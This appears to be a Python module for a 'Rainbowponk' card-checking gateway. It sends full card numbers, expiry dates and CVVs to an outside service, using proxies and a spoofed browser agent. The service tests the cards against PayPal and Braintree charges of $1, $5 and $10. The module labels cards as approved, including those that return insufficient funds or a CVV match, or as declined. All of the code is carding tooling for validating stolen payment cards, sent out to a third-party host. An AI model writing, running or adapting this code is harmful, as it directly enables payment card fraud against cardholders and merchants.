"""
Rainbowponk PayPal & Braintree Gateway
"""
import httpx
from typing import Optional, Dict, Any

LICENSE_KEY = "@MissNullMe"
BASE_URL = "https://rainbowponk.com"
PAYPAL_APIS = {"paypal_5": "api/api_paypal_1.php", "paypal_10": "api/api_paypal_2.php", "braintree_1": "api/eko.php"}

async def rainbowponk_paypal_check(card: str, month: str, year: str, cvv: str, proxy: Optional[dict] = None, gate_type: str = "paypal_5") -> Dict[str, Any]:
    card_data = f"{card}|{month}|{year}|{cvv}"
    api_file = PAYPAL_APIS.get(gate_type, PAYPAL_APIS["paypal_5"])
    url = f"{BASE_URL}/api/check"
    headers = {"Content-Type": "application/json", "Cookie": f"license_key={LICENSE_KEY}", "User-Agent": "Mozilla/5.0"}
    payload = {"lista": card_data, "gateway": api_file}
    try:
        async with httpx.AsyncClient(proxy=proxy, timeout=30.0, follow_redirects=True) as client:
            response = await client.post(url, json=payload, headers=headers)
            if response.status_code == 200:
                result = response.json()
                gate_name = {"paypal_5": "Rainbowponk PayPal $5", "paypal_10": "Rainbowponk PayPal $10", "braintree_1": "Rainbowponk Braintree $1"}.get(gate_type, "Rainbowponk PayPal")
                msg = str(result.get("message", "")).lower()
                if result.get("status") == "success" or "approved" in msg or "success" in msg:
                    return {"status": "approved", "message": result.get("message", "Payment Successful"), "card": card_data, "amount": gate_type.split("_")[1] if "_" in gate_type else "5", "gate": gate_name}
                elif "insufficient" in msg or "cvv" in msg:
                    return {"status": "approved", "message": "CVV Match / Insufficient Funds", "card": card_data, "gate": gate_name}
                elif "declined" in msg or "invalid" in msg:
                    return {"status": "declined", "message": result.get("message", "Card Declined"), "card": card_data, "gate": gate_name}
                else:
                    return {"status": "error", "message": result.get("message", "Unknown response"), "card": card_data, "gate": gate_name}
            else:
                return {"status": "error", "message": f"HTTP {response.status_code}", "card": card_data, "gate": gate_type}
    except Exception as e:
        return {"status": "error", "message": f"Error: {str(e)[:100]}", "card": card_data, "gate": gate_type}

async def paypal_5_check(card: str, month: str, year: str, cvv: str, proxy: Optional[dict] = None):
    return await rainbowponk_paypal_check(card, month, year, cvv, proxy, "paypal_5")
async def paypal_10_check(card: str, month: str, year: str, cvv: str, proxy: Optional[dict] = None):
    return await rainbowponk_paypal_check(card, month, year, cvv, proxy, "paypal_10")
async def braintree_1_check(card: str, month: str, year: str, cvv: str, proxy: Optional[dict] = None):
    return await rainbowponk_paypal_check(card, month, year, cvv, proxy, "braintree_1")
